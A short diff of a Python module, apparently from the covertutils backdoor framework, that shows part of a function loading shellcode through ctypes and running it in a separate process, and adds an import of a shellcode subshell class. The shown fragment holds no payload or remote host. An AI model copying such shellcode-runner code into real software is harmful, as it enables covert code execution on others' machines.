@@ -1,7 +1,6 @@
 
 
 
-
 def work( storage, message ) :
 	from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE, create_string_buffer
 	from multiprocessing import Process
@@ -26,3 +25,6 @@ def work( storage, message ) :
 	# run()
 	p = Process(target=run)				# run the shellcode as independent process
 	p.start()
+
+
+from covertutils.shells.subshells import ShellcodeSubShell as shell
